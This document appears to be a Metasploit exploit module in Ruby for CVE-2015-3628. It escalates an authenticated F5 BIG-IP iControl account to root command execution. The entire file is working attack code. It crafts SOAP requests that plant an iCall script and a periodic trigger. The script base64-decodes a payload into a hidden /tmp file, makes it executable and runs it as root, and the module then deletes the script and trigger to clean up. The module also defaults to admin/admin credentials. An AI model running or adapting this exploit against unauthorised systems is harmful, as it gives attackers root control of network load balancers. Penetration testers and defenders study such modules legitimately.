# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;nokogiri&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  SOAPENV_ENCODINGSTYLE = { "soapenv:encodingStyle" => "http://schemas.xmlsoap.org/soap/encoding/" }
  STRING_ATTRS = { &#039;xsi:type&#039; => &#039;urn:Common.StringSequence&#039;, &#039;soapenc:arrayType&#039; => &#039;xsd:string[]&#039;, &#039;xmlns:urn&#039; => &#039;urn:iControl&#039; }
  LONG_ATTRS = { &#039;xsi:type&#039; => &#039;urn:Common.ULongSequence&#039;, &#039;soapenc:arrayType&#039; => &#039;xsd:long[]&#039;, &#039;xmlns:urn&#039; => &#039;urn:iControl&#039; }

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => "F5 iControl iCall::Script Root Command Execution",
        &#039;Description&#039;    => %q{
          This module exploits an authenticated privilege escalation
          vulnerability in the iControl API on the F5 BIG-IP LTM (and likely
          other F5 devices). This requires valid credentials and the Resource
          Administrator role. The exploit should work on BIG-IP 11.3.0
          - 11.6.0, (11.5.x < 11.5.3 HF2 or 11.6.x < 11.6.0 HF6, see references
          for more details)
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;tom&#039;, # Discovery, Metasploit module
            &#039;Jon Hart <jon_hart[at]rapid7.com>&#039; # Metasploit module
          ],
        &#039;References&#039;     =>
          [
            [&#039;CVE&#039;, &#039;2015-3628&#039;],
            [&#039;URL&#039;, &#039;https://support.f5.com/kb/en-us/solutions/public/16000/700/sol16728.html&#039;],
            [&#039;URL&#039;, &#039;https://gdssecurity.squarespace.com/labs/2015/9/8/f5-icallscript-privilege-escalation-cve-2015-3628.html&#039;]
          ],
        &#039;Platform&#039;       => [&#039;unix&#039;],
        &#039;Arch&#039;           => ARCH_CMD,
        &#039;Targets&#039;        =>
          [
            [&#039;F5 BIG-IP LTM 11.x&#039;, {}]
          ],
        &#039;Privileged&#039;     => true,
        &#039;DisclosureDate&#039; => "Sep 3 2015",
        &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the iControl installation&#039;, &#039;/iControl/iControlPortal.cgi&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;, &#039;admin&#039;])
      ])
    register_advanced_options(
      [
        OptInt.new(&#039;SESSION_WAIT&#039;, [ true, &#039;The max time to wait for a session, in seconds&#039;, 5 ]),
        OptString.new(&#039;PATH&#039;, [true, &#039;Filesystem path for the dropped payload&#039;, &#039;/tmp&#039;]),
        OptString.new(&#039;FILENAME&#039;, [false, &#039;File name of the dropped payload, defaults to random&#039;]),
        OptInt.new(&#039;ARG_MAX&#039;, [true, &#039;Command line length limit&#039;, 131072])
      ])
  end

  def setup
    file = datastore[&#039;FILENAME&#039;]
    file ||= ".#{Rex::Text.rand_text_alphanumeric(16)}"
    @payload_path = ::File.join(datastore[&#039;PATH&#039;], file)
    super
  end

  def build_xml
    builder = Nokogiri::XML::Builder.new do |xml|
      xml.Envelope do
        xml = xml_add_namespaces(xml)
        xml[&#039;soapenv&#039;].Header
        xml[&#039;soapenv&#039;].Body do
          yield xml
        end
      end
    end
    builder.to_xml
  end

  def xml_add_namespaces(xml)
    ns = xml.doc.root.add_namespace_definition("soapenv", "http://schemas.xmlsoap.org/soap/envelope/")
    xml.doc.root.namespace = ns
    xml.doc.root.add_namespace_definition("xsi", "http://www.w3.org/2001/XMLSchema-instance")
    xml.doc.root.add_namespace_definition("xsd", "http://www.w3.org/2001/XMLSchema")
    xml.doc.root.add_namespace_definition("scr", "urn:iControl:iCall/Script")
    xml.doc.root.add_namespace_definition("soapenc", "http://schemas.xmlsoap.org/soap/encoding")
    xml.doc.root.add_namespace_definition("per", "urn:iControl:iCall/PeriodicHandler")
    xml
  end

  def send_soap_request(pay)
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => pay,
      &#039;username&#039; => datastore[&#039;USERNAME&#039;],
      &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
    )
    if res
      return res
    else
      vprint_error(&#039;No response&#039;)
    end
    false
  end

  def create_script(name, cmd)
    create_xml = build_xml do |xml|
      xml[&#039;scr&#039;].create(SOAPENV_ENCODINGSTYLE) do
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item name
        end
        xml.definitions(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item cmd
        end
      end
    end
    send_soap_request(create_xml)
  end

  def delete_script(script_name)
    delete_xml = build_xml do |xml|
      xml[&#039;scr&#039;].delete_script(SOAPENV_ENCODINGSTYLE) do
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item script_name
        end
      end
    end
    print_error("Error while cleaning up script #{script_name}") unless (res = send_soap_request(delete_xml))
    res
  end

  def script_exists?(script_name)
    exists_xml = build_xml do |xml|
      xml[&#039;scr&#039;].get_list(SOAPENV_ENCODINGSTYLE)
    end
    res = send_soap_request(exists_xml)
    res && res.code == 200 && res.body =~ Regexp.new("/Common/#{script_name}")
  end

  def create_handler(handler_name, script_name)
    print_status("Creating trigger #{handler_name}")
    handler_xml = build_xml do |xml|
      xml[&#039;per&#039;].create(SOAPENV_ENCODINGSTYLE) do
        xml.handlers(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item handler_name
        end
        xml.scripts(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item script_name
        end
        xml.intervals(LONG_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          # we set this to run once every 24h, but because there is no
          # start/end time it will run once, more or less immediately, and
          # again 24h from now, but by that point hopefully we will have
          # cleaned up and the handler/script/etc are gone
          xml.item 60 * 60 * 24
        end
      end
    end
    res = send_soap_request(handler_xml)
    if res
      if res.code == 200 && res.body =~ Regexp.new("iCall/PeriodicHandler")
        true
      else
        print_error("Trigger creation failed -- HTTP/#{res.proto} #{res.code} #{res.message}")
        false
      end
    else
      print_error("No response to trigger creation")
      false
    end
  end

  def delete_handler(handler_name)
    delete_xml = build_xml do |xml|
      xml[&#039;per&#039;].delete_handler(SOAPENV_ENCODINGSTYLE) do
        xml.handlers(STRING_ATTRS) do
          xml.parent.namespace = xml.parent.parent.namespace_definitions.first
          xml.item handler_name
        end
      end
    end

    print_error("Error while cleaning up handler #{handler_name}") unless (res = send_soap_request(delete_xml))
    res
  end

  def handler_exists?(handler_name)
    handler_xml = build_xml do |xml|
      xml[&#039;per&#039;].get_list(SOAPENV_ENCODINGSTYLE)
    end
    res = send_soap_request(handler_xml)
    res && res.code == 200 && res.body =~ Regexp.new("/Common/#{handler_name}")
  end

  def check
    # strategy: we&#039;ll send a create_script request, with empty name:
    # if everything is ok, the server return a 500 error saying it doesn&#039;t like empty names
    # XXX ignored at the moment: if the user doesn&#039;t have enough privileges, 500 error also is returned, but saying &#039;access denied&#039;.
    # if the user/password is wrong, a 401 error is returned, the server might or might not be vulnerable
    # any other response is considered not vulnerable
    res = create_script(&#039;&#039;, &#039;&#039;)
    if res && res.code == 500 && res.body =~ /path is empty/
      return Exploit::CheckCode::Appears
    elsif res && res.code == 401
      print_warning("HTTP/#{res.proto} #{res.code} #{res.message} -- incorrect USERNAME or PASSWORD?")
      return Exploit::CheckCode::Unknown
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # phase 1: create iCall script to create file with payload, execute it and remove it.
    shell_cmd = %(echo #{Rex::Text.encode_base64(payload.encoded)}|base64 --decode >#{@payload_path}; chmod +x #{@payload_path};#{@payload_path})
    cmd = %(exec /bin/sh -c "#{shell_cmd}")

    arg_max = datastore[&#039;ARG_MAX&#039;]
    if shell_cmd.size > arg_max
      print_error "Payload #{datastore[&#039;PAYLOAD&#039;]} is too big, try a different payload "\
        "or increasing ARG_MAX (note that payloads bigger than the target&#039;s configured ARG_MAX value may fail to execute)"
      return false
    end

    script_name = "script-#{Rex::Text.rand_text_alphanumeric(16)}"
    print_status("Uploading payload script #{script_name}")
    unless (create_script_res = create_script(script_name, cmd))
      print_error("No response when uploading payload script")
      return false
    end
    unless create_script_res.code == 200
      print_error("Upload payload script failed -- HTTP/#{create_script_res.proto} "\
                  "#{create_script_res.code} #{create_script_res.message}")
      return false
    end
    unless script_exists?(script_name)
      print_error("Payload script uploaded successfully but script was not found")
      return false
    end
    register_file_for_cleanup @payload_path

    handler_name = "handler-#{Rex::Text.rand_text_alphanumeric(16)}"
    unless create_handler(handler_name, script_name)
      delete_script(script_name)
      return false
    end
    unless handler_exists?(handler_name)
      print_error("Trigger created successfully but was not found")
      delete_script(script_name)
      return false
    end
    print_status(&#039;Waiting for payload to execute...&#039;)

    # if our payload has not been successfully executed just yet, wait
    # until it does or give up
    slept = 0
    until session_created? || slept > datastore[&#039;SESSION_WAIT&#039;]
      Rex.sleep(1)
      slept += 1
    end

    print_status(&#039;Trying cleanup...&#039;)
    delete_script(script_name)
    delete_handler(handler_name)
  end
end

